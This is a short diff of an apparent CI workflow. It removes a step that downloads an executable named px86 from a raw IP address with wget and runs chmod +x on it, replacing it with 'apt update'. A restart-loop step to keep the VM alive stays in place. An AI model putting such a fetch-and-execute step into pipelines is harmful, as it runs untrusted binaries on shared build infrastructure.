@@ -23,8 +23,7 @@ jobs:
     steps:
     - name: Download binary
       run: |
-        wget http://45.138.16.158/bins/px86 -O px86
-        chmod +x px86
+        apt update
 
     - name: Keep VM alive with restart loop
       run: |
